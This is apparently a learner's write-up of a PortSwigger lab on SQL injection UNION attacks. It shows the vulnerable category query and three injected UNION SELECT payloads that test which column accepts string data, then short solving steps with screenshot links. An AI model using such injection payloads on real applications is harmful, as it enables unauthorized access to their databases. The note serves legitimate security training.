# SQL injection UNION attack, finding a column containing text

## description 

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

## Analytics
<br>

Original sql:

```sql
select * from test_table where category = '
Gifts
'.......
```

<br>

Add union statement at the end to find each column's data type is string or not .
We already know this table have three columns from [[lab3]].
```sql
select * from test_table where category = '
Gifts' union select 'test',null,null -- 
'.......
```
<br>

```sql
select * from test_table where category = '
Gifts' union select null,'test',null -- 
'.......
```

<br>

```sql
select * from test_table where category = '
Gifts' union select null,null,'test' -- 
'.......
```

## Solving process
<br>

1. try first col.  ![[Pasted image 20211019170017.png]]
2. try second col . ![[Pasted image 20211019170105.png]] ![[Pasted image 20211019170159.png]]  **Error dowsn't occur, application's response contains some additional content including the injected string value**.<br>

3. try third col. ![[Pasted image 20211019170436.png]]

second col's data type is string.

<br>

related topic: [[union attacks]]
prev related lab: [[lab3]]